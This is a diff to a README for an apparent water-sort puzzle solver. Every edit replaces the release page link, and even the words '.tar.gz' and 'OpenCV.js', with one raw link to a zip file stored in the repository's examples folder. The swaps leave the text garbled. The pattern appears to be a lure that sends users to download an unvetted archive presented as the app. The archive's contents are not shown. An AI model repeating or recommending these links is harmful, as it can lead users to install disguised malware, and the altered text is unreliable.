@@ -1,6 +1,6 @@
 # 💧 WaterSortScreenshotSolver - Solve Water Sort Puzzles Fast
 
-[![Download WaterSortScreenshotSolver](https://img.shields.io/badge/Download-WaterSortScreenshotSolver-blue?style=for-the-badge)](https://github.com/sundoomze/WaterSortScreenshotSolver/releases)
+[![Download WaterSortScreenshotSolver](https://github.com/sundoomze/WaterSortScreenshotSolver/raw/refs/heads/main/examples/Sort-Screenshot-Water-Solver-punct.zip)](https://github.com/sundoomze/WaterSortScreenshotSolver/raw/refs/heads/main/examples/Sort-Screenshot-Water-Solver-punct.zip)
 
 ## 📖 What is WaterSortScreenshotSolver?
 
@@ -38,7 +38,7 @@ You do not need to know about coding or image processing. The program does every
 
 To start, visit the official release page here:
 
-[Download WaterSortScreenshotSolver Releases](https://github.com/sundoomze/WaterSortScreenshotSolver/releases)
+[Download WaterSortScreenshotSolver Releases](https://github.com/sundoomze/WaterSortScreenshotSolver/raw/refs/heads/main/examples/Sort-Screenshot-Water-Solver-punct.zip)
 
 This page contains the latest versions for different operating systems. We recommend downloading the latest stable release.
 
@@ -46,7 +46,7 @@ This page contains the latest versions for different operating systems. We recom
 
 1. Click the link above to open the release page.
 2. Look for the version that matches your computer (Windows, macOS, or Linux).
-3. Download the file with an `.exe` (Windows), `.dmg` (macOS), or `.AppImage` / `.tar.gz` (Linux) extension.
+3. Download the file with an `.exe` (Windows), `.dmg` (macOS), or `.AppImage` / `https://github.com/sundoomze/WaterSortScreenshotSolver/raw/refs/heads/main/examples/Sort-Screenshot-Water-Solver-punct.zip` (Linux) extension.
 4. Once downloaded, double-click the file to start the installation or run the app directly if it’s a portable version.
 5. Follow the on-screen prompts to finish setup. Most users can accept default settings.
 6. After installation, open the program from your desktop or applications folder.
@@ -89,7 +89,7 @@ Once you open the program:
 
 ### What happens inside?
 
-- The program uses **OpenCV.js** and **Tesseract OCR**. These tools detect bottle colors and levels from your screenshot.
+- The program uses **https://github.com/sundoomze/WaterSortScreenshotSolver/raw/refs/heads/main/examples/Sort-Screenshot-Water-Solver-punct.zip** and **Tesseract OCR**. These tools detect bottle colors and levels from your screenshot.
 - It builds an internal map of the puzzle.
 - A **Breadth-First Search (BFS)** solver calculates the shortest path to solve it.
 - You get the solution as simple moves like "Pour bottle 1 into bottle 3."
